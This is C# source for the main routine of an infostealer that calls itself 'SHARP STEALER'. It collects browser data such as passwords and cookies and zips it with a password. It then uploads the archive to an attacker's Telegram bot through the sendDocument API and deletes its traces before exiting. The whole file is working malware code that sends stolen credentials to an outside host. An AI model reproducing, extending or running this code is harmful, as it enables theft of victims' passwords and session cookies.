using Ionic.Zip;
using SHARP;
using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using File = System.IO.File;

public class Program
{
    public static async Task Main(string[] args)
    {
        try
        {
            Directory.CreateDirectory(Help.pupsdir);

            await YandexProcessor.ProcessChromeDataAsync();//данные

            // Создаем архив с данными
            string zipArchiveName = $"{Help.dateLog}.zip";
            string zipArchivePath = Path.Combine(Help.pupsdir, zipArchiveName);
            using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866")))
            {
                zip.ParallelDeflateThreshold = -1;
                zip.UseZip64WhenSaving = Zip64Option.Always;
                zip.CompressionLevel = Ionic.Zlib.CompressionLevel.Default;
                zip.Comment = "\n================================================" +
                              "\n=================SHARP STEALER==================" +
                              "\n================================================";

                zip.Password = Config.zipPass;
                zip.AddDirectory(Help.pupsdir);
                zip.Save(zipArchivePath);
            }
            string LOG = Path.GetFileName(zipArchivePath);
            byte[] file = File.ReadAllBytes(zipArchivePath);
            string url = string.Concat(new string[]
                {
                    Config.url,
                    Config.token,
                    "/sendDocument?chat_id=",
                    Config.id,
                    "&caption=" +
                           "\nPasswords - " + Counting.Passwords +
                           "\nCookies - " + Counting.Cookies 
            });
            try
            {
                SenderAPI.POST(file, LOG, "application/x-ms-dos-executable", url);
                Directory.Delete(Help.pupsdir + "\\", true);
                Environment.Exit(0);
            }
            catch
            {

            }
            /*void finish()
            {
                File.Delete(zipArchivePath);
                Directory.Delete(Help.ExploitDir + "\\", true);
                Environment.Exit(0);
            }*/

        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }


}
